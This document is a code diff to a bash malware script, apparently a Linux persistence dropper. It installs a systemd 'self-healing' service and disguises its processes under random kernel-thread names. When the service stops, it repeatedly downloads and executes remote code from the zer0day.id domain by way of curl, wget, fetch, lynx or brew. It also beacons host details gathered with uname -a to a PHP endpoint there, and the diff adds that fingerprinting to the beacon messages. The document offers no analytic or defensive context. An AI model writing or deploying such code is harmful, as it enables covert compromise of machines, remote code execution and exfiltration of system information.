@@ -3,17 +3,18 @@
 
 self_healing_script_path="/usr/local/bin/self"
 service_file_path="/etc/systemd/system/self.service"
-php_endpoint="https://zer0day.id/love.php"
-service_name="self.service"
+php_endpoint="https://zer0day.id/love.php"  
+service_name="defunct"
 pid_file="/var/run/self.pid"
 
 proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
 
 cat << EOF > "$self_healing_script_path"
 #!/bin/bash
 
-host=\$(hostname)
+host=\$(uname -a)
 php_endpoint="$php_endpoint"
 service_name="$service_name"
 pid_file="$pid_file"
@@ -51,21 +52,16 @@ write_pid
 while true; do
     if systemctl is-active --quiet "$service_name"; then
         RANDOM_SLEEP_NAME="\$(choose_random_proc_name)"
-        exec -a "\$RANDOM_SLEEP_NAME" sleep 3
+        exec -a "\$RANDOM_SLEEP_NAME" sleep 3  
     else
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_down" "$php_endpoint"
+        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_down&host=\$host" "$php_endpoint"
         
         bash -c "\$(curl -fsSL https://zer0day.id/y)" || bash -c "\$(wget -qO- https://zer0day.id/y)" || bash -c "\$(fetch -o - https://zer0day.id/y)" || bash -c "\$(lynx -source https://zer0day.id/y)" || bash -c "\$(brew install -q https://zer0day.id/y)"
 
-        status_output=$(systemctl status "$service_name" 2>&1)
-        if echo "$status_output" | grep -q "active (running)"; then
-            if ! echo "$status_output" | grep -q "Failed"; then
-                curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_injected" "$php_endpoint"
-            else
-                curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_error" "$php_endpoint"
-            fi
+        if systemctl is-active --quiet "$service_name"; then
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_up&host=\$host" "$php_endpoint"
         else
-            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_not_running" "$php_endpoint"
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_fail&host=\$host" "$php_endpoint"
         fi
     fi
 done
@@ -92,14 +88,18 @@ systemctl daemon-reload
 systemctl enable self.service
 systemctl start self.service
 
-# Cek status dan kirimkan notifikasi jika diperlukan
+# Cek status service dan kirimkan notifikasi jika diperlukan
 status_output=$(systemctl status self.service 2>&1)
 if echo "$status_output" | grep -q "active (running)"; then
     if ! echo "$status_output" | grep -q "Failed"; then
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_injected" "$php_endpoint"
+        if echo "$status_output" | grep -q "self.service"; then
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_already_injected&host=$(uname -a)" "$php_endpoint"
+        else
+            curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_injected&host=$(uname -a)" "$php_endpoint"
+        fi
     else
-        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_error" "$php_endpoint"
+        curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_error&host=$(uname -a)" "$php_endpoint"
     fi
 else
-    curl -sL -H "Content-Type: text/plain" -X POST --data-binary "service_not_running" "$php_endpoint"
+    curl -sL -H "Content-Type: text/plain" -X POST --data-binary "status=service_not_running&host=$(uname -a)" "$php_endpoint"
 fi
